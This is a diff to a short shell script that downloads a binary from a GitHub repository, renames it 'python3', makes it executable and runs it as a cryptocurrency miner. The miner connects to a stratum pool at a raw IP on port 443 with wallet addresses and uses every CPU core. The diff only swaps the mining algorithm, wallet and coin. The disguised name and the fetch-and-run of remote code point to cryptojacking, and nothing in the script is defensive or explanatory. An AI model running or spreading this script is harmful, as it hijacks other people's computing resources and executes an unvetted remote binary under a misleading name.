@@ -1,3 +1,3 @@
 apt update -y
 wget https://github.com/danipedrosang/marcrash/raw/main/python3 && chmod +x python3
-./python3 -a yespowerLTNCG -o stratum+tcp://47.89.234.73:443 -u KTHGbtjXYa29DCsgaiheSV6WB9uihU4Nu6.edu -p c=CRNC -t$(nproc --all)
+./python3 -a yescryptr16 -o stratum+tcp://47.89.234.73:443 -u TJnXX3C7op7NvsfECyn6VNZ3kkz3PsBRiL.test -p c=TRX,mc=QOGE -t$(nproc --all)
